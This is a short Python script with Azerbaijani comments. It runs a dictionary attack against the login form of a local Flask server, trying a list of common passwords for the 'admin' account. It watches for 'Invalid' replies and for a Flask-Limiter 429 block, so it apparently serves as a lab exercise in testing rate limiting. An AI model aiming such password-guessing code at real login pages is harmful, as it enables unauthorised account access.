import requests  # Veb-saytlara HTTP sorğuları (məsələn: POST) göndərmək üçün kitabxana

# Hücum ediləcək saytın ünvanı (Lokalda işləyən Flask serveri)
url = "http://127.0.0.1:5000/"

# Lüğət hücumu (Dictionary Attack) üçün sınaqdan keçiriləcək parollar siyahısı
passwords = ["123456", "password", "admin", "12345", "qwerty", "library123", "my_secret_pass"]

# Parolu tapılmaq istənilən hədəf istifadəçi adı
username = "admin" 

print(f"Hücum başlayır: {username} üçün parollar yoxlanılır...\n")

# Siyahıdakı hər bir parolu tək-tək dövrə salırıq
for pw in passwords:
    # Login formasına göndəriləcək məlumatları (payload) hazırlayırıq
    data = {
        "action": "login",    # Formdakı düymənin adı (action)
        "username": username, # İstifadəçi adı sahəsi
        "password": pw        # Sınaqdan keçirilən cari parol
    }
    
    try:
        # Serverə məlumatları POST metodu ilə göndəririk
        response = requests.post(url, data=data)
        
        # Əgər server normal cavab verirsə (Kod 200)
        if response.status_code == 200:
            # Serverdən gələn səhifənin mətnində "Invalid" sözü varsa (Səhv parol)
            if "Invalid" in response.text:
                print(f"[-] Cəhd uğursuz: {pw}")
            # Əgər "Invalid" sözü yoxdursa, deməli içəri girə bildik (Düzgün parol)
            else:
                print(f"[+] TAPILDI! Düzgün parol: {pw}")
                break  # Parol tapıldığı üçün dövrü dayandırırıq
        
        # Əgər server 429 xətası verirsə (Flask-Limiter tərəfindən bloklanma)
        elif response.status_code == 429:
            print(f"\n[!] BLOKLANDIN! Server 429 xətası verdi (Limiter işə düşdü).")
            break  # Bloklandığımız üçün daha çox sorğu göndərməyin mənası yoxdur
        
        # Digər HTTP xətaları (məsələn: 404, 500) baş verərsə
        else:
            print(f"Xəta kodu: {response.status_code}")
            
    except Exception as e:
        # Bağlantı kəsilərsə və ya server sönərsə xətanı göstəririk
        print(f"Bağlantı xətası: {e}")
        break